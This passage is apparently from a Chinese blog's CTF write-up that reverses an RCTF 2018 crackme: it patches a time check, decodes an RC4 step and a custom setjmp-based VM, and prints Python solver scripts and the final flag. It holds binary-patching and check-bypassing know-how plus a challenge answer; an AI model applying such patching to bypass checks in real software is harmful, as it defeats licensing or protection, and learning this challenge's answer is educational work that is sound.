[rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v5 = time64(a1);</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">0x5AFFE78F</span> || v5 &gt; <span class="number">0x5B028A8F</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  srand((<span class="keyword">unsigned</span> <span class="keyword">int</span>)a1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i )</span><br><span class="line">    byte_405020[i] ^= rand();</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  sub_4027ED((__int64)a1, a2, &amp;v4, (__int64)byte_405020, &amp;v3);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">0x700</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_4099D0[<span class="number">0</span>] = v3;</span><br><span class="line">    result = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    dword_4099D0[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>time64函数返回当前时间戳, 根据这段代码, 返回的时间戳应该在(0x5AFFE78F, 0x5B028A8F]这个范围内程序才会继续执行。</p><p>其后以时间戳做为随机数种子, 取随机数对byte405020数组异或运算, 再通过sub4027ED这个函数对byte_405020数组进行一些运算, 最终得到v4的值, 并判断v4的值是否等于0x700.</p><p>在后面的代码中可知, 如果result ==0, 那么程序将打印出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag only appears at a specific time, range [2018-05-19 09:00, 2018-05-21 09:00)</span><br><span class="line">Better luck next time :)</span><br></pre></td></tr></table></figure><p>并退出。观察到0x5B028A8F - 0x5AFFE78F = 0x2A300, 所以time的范围算是比较小的了, 我们可以修改程序代码, 让程序自己跑出time。</p><p>修改如下:（IDA修改指令快捷键为Ctrl+Alt+K, 修改后patch上去即可。剩下的就看各位的汇编功底了！）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_402268</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0x5AFFE790</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)++v5 &gt; <span class="number">0x5B028A8F</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    srand(a1);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i )</span><br><span class="line">      byte_405120[i] = rand() ^ byte_405020[i];<span class="comment">//这里我取用了byte_405120来存放每次异或的值, 所以这个修改吧, 是永久的0.0, 要么另起一个程序要么记得这里改回来0.0</span></span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    sub_4027ED(a1, a2, (__int64)&amp;v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v4 != <span class="number">1792</span> );</span><br><span class="line">  dword_4099D0[<span class="number">0</span>] = v3;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在dword_4099D0[0] = v3;处下断, 即可跑出时间:0x5b00e398</p><p>为了接下来方便调试, 直接将v5设置为0x5b00e398, 即可进入第二步验证:输入验证</p><p>输入验证<br>经过调试, 找到输入验证的函数</p><p>__</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">int64 __fastcall <span class="title">sub_4023B1</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// [rsp+43h] [rbp-Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+47h] [rbp-9h]</span></span><br><span class="line">  __int64 *Count; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !dword_4099D0[<span class="number">0</span>] )</span><br><span class="line">    <span class="built_in">exit</span>((<span class="keyword">int</span>)a1);</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v7 = dword_4099D0[<span class="number">0</span>];</span><br><span class="line">  sub_402218(a1, a2, <span class="number">49</span>, (__int64)&amp;unk_4052A0, dword_4099D0[<span class="number">0</span>]);</span><br><span class="line">  v3 = <span class="number">0LL</span>;</span><br><span class="line">  v4 = <span class="number">0LL</span>;</span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  v6 = <span class="number">0LL</span>;</span><br><span class="line">  Count = (__int64 *)((<span class="keyword">char</span> *)&amp;v3 + <span class="number">4</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(a1, a2, (<span class="keyword">char</span> *)&amp;v3 + <span class="number">4</span>, <span class="string">&quot;%26s&quot;</span>);</span><br><span class="line">  RC4((__int64)a1, a2, <span class="number">26LL</span>, (__int64)Count, (<span class="keyword">unsigned</span> __int64)&amp;v7);</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)check((<span class="keyword">size_t</span>)a1) )</span><br><span class="line">    <span class="keyword">return</span> sub_402218(a1, a2, <span class="number">6</span>, (__int64)aC, dword_4099D0[<span class="number">0</span>]);</span><br><span class="line">  RC4((__int64)a1, a2, <span class="number">26LL</span>, (__int64)Count, (<span class="keyword">unsigned</span> __int64)&amp;v7);</span><br><span class="line">  sub_401FFB(a1);</span><br><span class="line">  sub_402218(a1, a2, <span class="number">35</span>, (__int64)&amp;unk_4052E0, dword_4099D0[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">puts</span>(a1);</span><br><span class="line">  <span class="keyword">return</span> sub_402218(a1, a2, <span class="number">35</span>, (__int64)&amp;unk_4052E0, dword_4099D0[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h3><p>RC4的辨识度较高:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">RC4</span><span class="params">(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, <span class="keyword">unsigned</span> <span class="keyword">int</span> a6)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v6; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [rsp+20h] [rbp-60h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+140h] [rbp+C0h]</span></span><br><span class="line"></span><br><span class="line">  v10 = a4;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v8 + <span class="number">4</span>, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">  v6 = &amp;v8 + <span class="number">36</span>;</span><br><span class="line">  sub_401C67((__int64)v6, a2, a5, (__int64)&amp;v9, a6);</span><br><span class="line">  <span class="keyword">return</span> sub_401E02((__int64)v6, a2, v10);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在sub_401C67中密钥扩展:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">255</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)((<span class="keyword">signed</span> <span class="keyword">int</span>)i + a4) = i;<span class="comment">//这里每一位都赋值位数</span></span><br><span class="line">    result = (<span class="keyword">signed</span> <span class="keyword">int</span>)i;</span><br><span class="line">    v7[i] = *(_BYTE *)(i % a5 + a3);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>在sub_401E02中的加密运算:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_401E02</span><span class="params">(__int64 a1, __int64 a2, __int64 a3, __int64 a4, <span class="keyword">unsigned</span> <span class="keyword">int</span> a5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// ST0F_1</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v10; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a5 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v10 = (<span class="keyword">unsigned</span> __int8)(((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((v10 + <span class="number">1</span>) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>) + v10 + <span class="number">1</span>) - ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((v10 + <span class="number">1</span>) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>);</span><br><span class="line">    v5 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)((v9 + *(<span class="keyword">unsigned</span> __int8 *)(v10 + a4)) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>;</span><br><span class="line">    v9 = (<span class="keyword">unsigned</span> __int8)(v5 + v9 + *(_BYTE *)(v10 + a4)) - v5;</span><br><span class="line">    v6 = *(_BYTE *)(v10 + a4);</span><br><span class="line">    *(_BYTE *)(v10 + a4) = *(_BYTE *)(v9 + a4);</span><br><span class="line">    *(_BYTE *)(a4 + v9) = v6;</span><br><span class="line">    *(_BYTE *)(i + a3) ^= *(_BYTE *)((<span class="keyword">unsigned</span> __int8)(*(_BYTE *)(v10 + a4) + *(_BYTE *)(v9 + a4)) + a4);<span class="comment">//这里每一位都异或运算后的密钥, 所以RC4甚至可以直接导出这里的异或数组</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="check"><a href="#check" class="headerlink" title="check"></a>check</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">check</span><span class="params">(<span class="keyword">size_t</span> Count, <span class="keyword">char</span> *a2, __int64 a3, <span class="keyword">size_t</span> input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ST12C_4</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [rsp+124h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v9; <span class="comment">// [rsp+128h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+12Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strncpy</span>((<span class="keyword">char</span> *)Count, a2, input);</span><br><span class="line">  signal(Count, (<span class="keyword">void</span> (__cdecl *)(<span class="keyword">int</span>))a2);</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">1</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  r1 = (<span class="keyword">unsigned</span> __int64)&amp;byte_405320;<span class="comment">//const常量</span></span><br><span class="line">  LODWORD(r2) = (<span class="keyword">unsigned</span> __int64)&amp;input_RC4;<span class="comment">//RC4后的输入</span></span><br><span class="line">  <span class="keyword">while</span> ( v9 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = setjmp((_JBTYPE *)Count);</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">0xA8</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(&amp;r0 + (opcode[v10] &gt;&gt; <span class="number">4</span>)) -= *(&amp;r0 + (opcode[v10] &amp; <span class="number">0xF</span>));<span class="comment">// A8</span></span><br><span class="line">      ++v10;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v4 &gt; <span class="number">0xA8</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">0xAC</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *(&amp;r0 + (opcode[v10] &gt;&gt; <span class="number">4</span>)) &amp;= *(&amp;r0 + (opcode[v10] &amp; <span class="number">0xF</span>));</span><br><span class="line">        ++v10;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v4 &gt; <span class="number">0xAC</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v4 == <span class="number">0xAE</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          *(&amp;r0 + (opcode[v10] &gt;&gt; <span class="number">4</span>)) ^= *(&amp;r0 + (opcode[v10] &amp; <span class="number">0xF</span>));</span><br><span class="line">          ++v10;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( v4 &lt; <span class="number">0xAE</span> )                   <span class="comment">// AD</span></span><br><span class="line">        &#123;</span><br><span class="line">          *(&amp;r0 + opcode[v10]) = (<span class="keyword">unsigned</span> __int8)~*((_BYTE *)&amp;r0 + <span class="number">4</span> * opcode[v10]);</span><br><span class="line">          ++v10;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v4 != <span class="number">0xAF</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_43;</span><br><span class="line">          cmp_0 = opcode[v10] &gt;&gt; <span class="number">4</span>;</span><br><span class="line">          cmp_1 = opcode[v10] &amp; <span class="number">0xF</span>;</span><br><span class="line">          <span class="keyword">if</span> ( !setjmp((_JBTYPE *)Count) )</span><br><span class="line">            opcode[v10] = cmp_0 / opcode[v10 + <span class="number">1</span>];</span><br><span class="line">          v10 += <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v4 == <span class="number">0xAA</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *(&amp;r0 + opcode[v10]) = *(&amp;r0 + opcode[v10 + <span class="number">1</span>]);</span><br><span class="line">        v10 += <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v4 &gt; <span class="number">0xAA</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *(&amp;r0 + opcode[v10]) = opcode[v10 + <span class="number">1</span>];</span><br><span class="line">        v10 += <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        *(&amp;r0 + (opcode[v10] &gt;&gt; <span class="number">4</span>)) += *(&amp;r0 + (opcode[v10] &amp; <span class="number">0xF</span>));</span><br><span class="line">        ++v10;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v4 == <span class="number">0xA3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(&amp;r0 + (opcode[v10] &gt;&gt; <span class="number">4</span>)) |= *(&amp;r0 + (opcode[v10] &amp; <span class="number">0xF</span>));</span><br><span class="line">      ++v10;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v4 &gt; <span class="number">0xA3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">0xA6</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !r5 )</span><br><span class="line">          v10 += (<span class="keyword">char</span>)opcode[v10];</span><br><span class="line">        ++v10;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v4 &gt; <span class="number">0xA6</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( r5 )</span><br><span class="line">          v10 += (<span class="keyword">char</span>)opcode[v10];</span><br><span class="line">        ++v10;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v4 != <span class="number">0xA5</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_43;</span><br><span class="line">        v10 += opcode[v10] + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v4 == <span class="number">0xA0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(&amp;r0 + opcode[v10]) = *(<span class="keyword">unsigned</span> __int8 *)(<span class="keyword">signed</span> <span class="keyword">int</span>)*(&amp;r0 + opcode[v10]);</span><br><span class="line">      ++v10;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v4 == <span class="number">0xA2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = v10 + <span class="number">1</span>;</span><br><span class="line">      *(&amp;r0 + opcode[v6]) &gt;&gt;= *(&amp;r0 + opcode[v6]);</span><br><span class="line">      v10 = v6 + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = opcode[v10];</span><br><span class="line">        longjmp_0((_JBTYPE *)Count, (<span class="keyword">int</span>)a2);</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_43:</span><br><span class="line">      v9 = <span class="number">0</span>;</span><br><span class="line">      v8 = r5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>则调试分析, 如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0000000000409040 r0              dd ?                    ; DATA XREF: sub_402930+32↑o</span><br><span class="line">.bss:0000000000409040                                         ; sub_402930+4C↑o ...</span><br><span class="line">.bss:0000000000409044 r1              dd ?                    ; DATA XREF: check+52↑w</span><br><span class="line">.bss:0000000000409048 ; _DWORD *r2</span><br><span class="line">.bss:0000000000409048 r2              dd ?                    ; DATA XREF: check+5F↑w</span><br><span class="line">.bss:000000000040904C r3              dd ?</span><br><span class="line">.bss:0000000000409050 r4              dd ?</span><br><span class="line">.bss:0000000000409054 r5              dd ?                    ; DATA XREF: check:loc_403073↑r</span><br><span class="line">.bss:0000000000409054                                         ; check:loc_40309A↑r ...</span><br><span class="line">.bss:0000000000409058 r6              dd ?</span><br><span class="line">.bss:000000000040905C                 dd ?</span><br><span class="line">.bss:0000000000409060 cmp_0           dd ?                    ; DATA XREF: sub_402930+22↑r</span><br><span class="line">.bss:0000000000409060                                         ; sub_402930+5B↑r ...</span><br><span class="line">.bss:0000000000409064 cmp_1           dd ?                    ; DATA XREF: sub_402930+3C↑r</span><br><span class="line">.bss:0000000000409064                                         ; check+35A↑w</span><br></pre></td></tr></table></figure><p>AF的操作并不在0xAF中, 因为这里的除数永远等于0, 所以AF的操作在前面的除0异常处理signal中, 这里有点坑, IDA分析出来的和实际汇编代码看着不太一样。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v4 != <span class="number">0xAF</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_43;</span><br><span class="line">          cmp_0 = opcode[v10] &gt;&gt; <span class="number">4</span>;</span><br><span class="line">          cmp_1 = opcode[v10] &amp; <span class="number">0xF</span>;</span><br><span class="line">          <span class="keyword">if</span> ( !setjmp((_JBTYPE *)Count) )</span><br><span class="line">            opcode[v10] = cmp_0 / opcode[v10 + <span class="number">1</span>];</span><br><span class="line">          v10 += <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004029EC                 lea     rdx, sub_402930</span><br><span class="line">.text:00000000004029F3                 mov     ecx, 8</span><br><span class="line">.text:00000000004029F8                 call    signal</span><br></pre></td></tr></table></figure><p>在sub_402930中:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">sub_402930</span><span class="params">(_JBTYPE *a1, <span class="keyword">void</span> (__cdecl *a2)(<span class="keyword">int</span>), __int64 a3, <span class="keyword">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a4 == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    signal((<span class="keyword">int</span>)a1, a2);</span><br><span class="line">    *(&amp;r0 + cmp_0) = *(&amp;r0 + cmp_0) == *(&amp;r0 + cmp_1);</span><br><span class="line">    longjmp_0(a1, (<span class="keyword">int</span>)a2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>((<span class="keyword">int</span>)a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终, opcode为:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3 AB 03 00  : mov r3, 0x00</span><br><span class="line">3 AB 04 1A  : mov r4, 0x1A</span><br><span class="line">3 AB 00 66  : mov r0, 0x66</span><br><span class="line">s1:</span><br><span class="line">3 AA 05 02  : mov r5, r2</span><br><span class="line">2 A9 53     : add r5, r3</span><br><span class="line">2 A0 05     : mov r5, [r5]</span><br><span class="line">3 AB 06 CC  : mov r6, 0xCC</span><br><span class="line">2 A9 56     : add r5, r6</span><br><span class="line">3 AB 06 FF  : mov r6, 0xFF</span><br><span class="line">2 AC 56     : and r5, r6</span><br><span class="line">2 AE 50     : xor r5, r0</span><br><span class="line">2 AD 00     : r0 = ~r0</span><br><span class="line">3 AA 06 05  : mov r6, r5</span><br><span class="line">3 AA 05 01  : mov r5, r1</span><br><span class="line">2 A9 53     : add r5, r3</span><br><span class="line">2 A0 05     : mov r5, [r5]</span><br><span class="line">3 AF 56 00  : cmp r5, r6</span><br><span class="line">3 A7 01     : jz  s2</span><br><span class="line">1 CC  </span><br><span class="line">s2 :</span><br><span class="line">2 A9 35     : add r3, r5</span><br><span class="line">3 AA 05 03  : mov r5, r3</span><br><span class="line">3 AF 54 00  : cmp r5, r4</span><br><span class="line">3 A6 D1     : jnz s1</span><br><span class="line">1 CC  </span><br></pre></td></tr></table></figure><p>写成python大概是这样:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> r3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    r5 += <span class="number">0xCC</span></span><br><span class="line">    r5 &amp;= <span class="number">0xFF</span></span><br><span class="line">    r5 ^= r0</span><br><span class="line">    r0 = (~r0) &amp; <span class="number">0xFF</span></span><br><span class="line">    r6 = r5</span><br><span class="line">    r5 = const[r3]</span><br><span class="line">    <span class="keyword">if</span> r5 != r6 :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    r3 += <span class="number">1</span></span><br><span class="line">    r5 = <span class="built_in">input</span>[r3]</span><br></pre></td></tr></table></figure><p>则求出RC4之后的输入为:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">const = [<span class="number">0x89</span>, <span class="number">0xC1</span>, <span class="number">0xEC</span>, <span class="number">0x50</span>, <span class="number">0x97</span>, <span class="number">0x3A</span>, <span class="number">0x57</span>, <span class="number">0x59</span>, <span class="number">0xE4</span>, <span class="number">0xE6</span>,  <span class="number">0xE4</span>, <span class="number">0x42</span>, <span class="number">0xCB</span>, <span class="number">0xD9</span>, <span class="number">0x08</span>, <span class="number">0x22</span>, <span class="number">0xAE</span>, <span class="number">0x9D</span>, <span class="number">0x7C</span>, <span class="number">0x07</span>,  <span class="number">0x80</span>, <span class="number">0x8F</span>, <span class="number">0x1B</span>, <span class="number">0x45</span>, <span class="number">0x04</span>, <span class="number">0xE8</span>]</span><br><span class="line"></span><br><span class="line">r0 = <span class="number">0x66</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">26</span>):</span><br><span class="line">    r5 = const[i]</span><br><span class="line">    r5 ^= r0</span><br><span class="line">    r5 = (r5 - <span class="number">0xCC</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    r0 = (~r0) &amp; <span class="number">0xFF</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\\x&#x27;</span> + <span class="built_in">hex</span>(r5)[<span class="number">2</span>:], end = <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>RC4解密:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line">key = <span class="string">b&#x27;\xA4\xE7\x2C\x32&#x27;</span> * <span class="number">4</span></span><br><span class="line"></span><br><span class="line">obj = ARC4.new(key)</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span> = <span class="string">b&quot;\x23\x8c\xbe\xfd\x25\xd7\x65\xf4\xb6\xb3\xb6\x0f\xe1\x74\xa2\xef\xfc\x38\x4e\xd2\x1a\x4a\xb1\x10\x96\xa5&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(obj.decrypt(<span class="built_in">input</span>))</span><br></pre></td></tr></table></figure><p>得到输入:@ck_For_fun_02508iO2_2iOR}, 输入后输出以下信息, 摘掉眼镜打开高清视界0.0</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">the part of flag was protected by a magic spell!</span><br><span class="line">@ck_For_fun_02508iO2_2iOR&#125;</span><br><span class="line">.843fFDCb52bc573DA7e336b4BCC97C6E.</span><br><span class="line">.1adC4b19FEBA1Bf9D182FAe8Eac1AeBF.</span><br><span class="line">.CB7EEFeD2B2D6dd76f   bE  D0 ec92.</span><br><span class="line">.DD1C36EDBaf56 63b6 ad83 f5D a60D.</span><br><span class="line">.28CCE56eaBbcF 0Bb9 ed7F 669 aff7.</span><br><span class="line">.    dC   83     4    bf a01     .</span><br><span class="line">.  DAB 2a0 CBD eB74 9eF6 0De 1Bf .</span><br><span class="line">.  E15 d55A276 7A4c fA7 eE72 dc7 .</span><br><span class="line">.  afB bE0fa2e 7Bf9 Eb14 6A5 891 .</span><br><span class="line">.  DCf c907BF9 aFBB 28eA 4dE aB1 .</span><br><span class="line">.  B25 c5B 16d d90f 0cb0 D78 Edd .</span><br><span class="line">.  aEA7   eDaD   07 743A 935 27d .</span><br><span class="line">.D38f5b1FacEaBDeFBEEcbA4 0b9D0A0f.</span><br><span class="line">.ce1A5DFCe012a0a62A5e2D8  8e38C9A.</span><br><span class="line">.CC1b26fF12fC01f8aeB7cAC06c65FCbe.</span><br><span class="line">.e663471A878EcE289bee7c11d7f8CF7b.</span><br><span class="line">.--------------------------------.</span><br><span class="line">    @ck_For_fun_02508iO2_2iOR&#125;</span><br><span class="line">.--------------------------------.</span><br></pre></td></tr></table></figure><p>最终flag为:rctf{h@ck_For_fun_02508iO2_2iOR}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write up </tag>
            
            <tag> RC4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 红帽杯</title>
      <link href="/wp-games-2019redhat/"/>
      <url>/wp-games-2019redhat/</url>
      
